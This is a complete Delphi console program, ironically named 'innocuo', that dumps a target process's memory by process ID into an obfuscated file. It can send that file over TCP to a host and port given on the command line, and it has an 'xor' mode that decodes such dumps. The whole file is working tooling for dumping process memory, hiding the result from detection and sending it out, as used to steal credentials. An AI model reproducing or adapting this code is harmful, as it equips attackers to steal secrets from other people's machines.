program innocuo;

{$APPTYPE CONSOLE}

{$R *.res}

uses
  System.SysUtils,
  uimagehlp,uxor,IdTCPClient{,IdTCPConnection};

var
key:string;

var idTCPClient         : TIdTCPClient;

begin
  try
    if LowerCase(paramstr(1))='xor' then
    begin

     key:='FF';
     if xorfile(paramstr(2),ExtractFileName(paramstr(2))+'.noxor',strtoint('$'+key) )=true
       then writeln('Done!')
       else writeln('Error decoding file');
    end
    else
     begin
      dumpprocess(strtoint(paramstr(1))); //15156
      if paramstr(2)<>'' then
       begin
        idTCPClient                 := TIdTCPClient.Create();
        idTCPClient.Host            := paramstr(2);
        idTCPClient.Port            := strtoint(paramstr(3));
        IdTCPClient.Connect;
        idTCPClient.IOHandler.WriteFile(paramstr(1)+'.dmp.obfusco');
        idTCPClient.Disconnect;
       end;
     end;
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.
